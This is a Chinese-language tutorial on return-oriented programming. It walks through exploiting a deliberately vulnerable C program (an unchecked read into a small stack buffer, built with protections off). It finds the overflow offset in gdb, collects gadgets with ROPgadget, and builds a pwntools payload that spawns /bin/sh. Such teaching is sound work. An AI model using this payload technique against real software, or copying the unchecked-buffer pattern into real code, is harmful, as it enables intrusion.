
## [ROP 攻擊](https://en.wikipedia.org/wiki/Return-oriented_programming)
- 使用一連串的指令組合成一個完整的功能
	- 利用 ret 讓程式執行目標指令
	- RIP 裡面的內容是下一個要執行的指令；RSP 是目前 stack top 的位置
	- 在正常的情況下，程式當呼叫 `ret` 前會使用 pop 將 stack 內無用的內容丟掉、接著把 `rbp` 的內容設為 retrun 後的 `rbp`，最後讓 `rsp` 指在 return address 上
	- 藉由 overflow 在 stack 中加入一連串的指令(且指令以 ret 結尾)，當程式執行 ret 時就會執行 `rsp` 所指的內容，因為每個指令都是以 ret 結尾，所以會繼續執行 stack 中的下一道指令
- 如此一來就能使程式執行一連串的指令，ROP 的目的就是透過這一連串的指令組合成一個**有意義**的行為



# 範例

```c
#include<stdio.h>
#include<unistd.h>

int main(){
    char buf[20];
    puts("Do you want to learn ROP ?\n");
    printf("Your answer ?\n ");
    fflush(stdout);
    read(0,buf,160);
}
```
> 編譯時關閉 gcc 的保護 stack overflow 保護機制及關閉 ASLR

## 確認 buffer overflow 會碰觸到 return address

- 用 gdb 確認 overflow 並找出 overflow 的 offset
```c
$ gdb rop
(gdb) b main
(gdb) r
(gdb)  pattc 100
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
```
- 以 pattc 產生測試的文字長度，搭配 crashoff 找出造成 overflow 的 offset

```c
(gdb) c
Continuing.
Do you want to learn ROP ?
Your answer ?
 AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Legend: code, data, rodata, heap, value
Stopped reason: SIGSEGV
0x00000000004009fa in main ()
```
- 上述訊息表示 buffer overflow 導致了 main 的 return address 錯誤

```c
(gdb) crashoff
0x41304141 found at offset: 40
```
- 計算出 offset 為40

## 透過 ROP 取得 shell

想讓程式執行 `exec("/bin/sh")`，但程式中沒有這段程式碼，所以必須透過 ROP 組成

系統呼叫的執行方式  [system call table](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

|Syscall #|Param 1|Param 2|Param 3|Param 4|Param 5|Param 6|
|---|---|---|---|---|---|---|
|rax|rdi|rsi|rdx|r10|r8|r9|
|59|const char *filename|const char *const argv[]|const char *const envp[]|-|-|-|
- 59 在 system call 中是 sys_execve 的編號


### 觸發system call並執行shell的條件

- rdi = pointer to filename
    - 讓 rdi 指向一個 buffer ，buffer 儲存的內容為 “/bin/sh”
- rsi = 0
- rax = 0x3b
- rdx = 0

找出可利用的指令將 rax, rdi, rsi, rdx 的內容設定成目標數值
- pop rax
    - 將 stack top 放入 rax
- pop rdi
    - 將 stack top 放入 rdi
- pop rsi
    - 將 stack top 放入 rsi
- pop rdx
    - 將 stack top 放入 rdx

### 尋找指令位置

以尋找帶有 rdi 的指令為例：

```shell
$ ROPgadget --binary rop | grep 'rdi' 
```

- 找到可利用的指令並記錄記憶體位置，**切記指令結尾必須要是 ret**
```c
0x0000000000467265 : syscall ; ret  #呼叫 system call
0x00000000004014c6 : pop rdi ; ret
0x0000000000478636 : pop rax ; pop rdx ; pop rbx ; ret
0x00000000004015e7 : pop rsi ; ret
0x000000000047a622 : mov qword ptr [rdi], rsi ; ret  #將 rdi 作為一個 ptr，把 rsi 的內容放入 rdi 指到目標內容
```

- gdb 找可用的 buffer (作為 filename)
```c
(gdb) vmmap
Warning: not running or target is remote
Start              End                Perm      Name
0x004002c8         0x004a1149         rx-p      /home/xxxx/下載/函式呼叫/rop
0x00400190         0x004c9497         r--p      /home/xxxx/下載/函式呼叫/rop
0x006c9eb8         0x006cd408         rw-p      /home/xxxx/下載/函式呼叫/rop

使用 0x006c9eb8 可寫入的 buffer
```

### 實作攻擊

- python pwntool module 製作 payload (檔名 `payload.py`)
```python
from pwn import *
# 把剛剛紀錄的 gadget 位置、buffer 位置、offset 紀錄
offset = 40
scall = 0x467265
pop_rdi = 0x4014c6
pop_rsi = 0x4015e7
pop_rax_rdx_rbx = 0x478636
mov_ptr_rdi_rsi = 0x47a622
buf = 0x006c9eb8+200 #避免 buffer 以有其他用途，往後200單位開始使用

# 製作 payload 
# flat 將 [] 內容從字串形式轉換成 p64 編碼
# \x00 
payload = 'a'*40+flat([pop_rdi,buf,pop_rsi,'/bin/sh\x00',mov_ptr_rdi_rsi,pop_rax_rdx_rbx,0x3b,0x0,0x0,pop_rsi,0x0,scall])
print(payload)
```


```shell
$ python payload.py >> payload
$ cat payload
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@l@/bin/sh"G6G;@erF
```

```c
$ gdb -q rop
(gdb) r < payload
Starting program: rop < payload
Do you want to learn ROP ?

Your answer ?
 process 828 is executing new program: /bin/dash
[Inferior 1 (process 828) exited normally]

這個程式成功呼叫 `/bin/dash `
```

#C語言 #函式 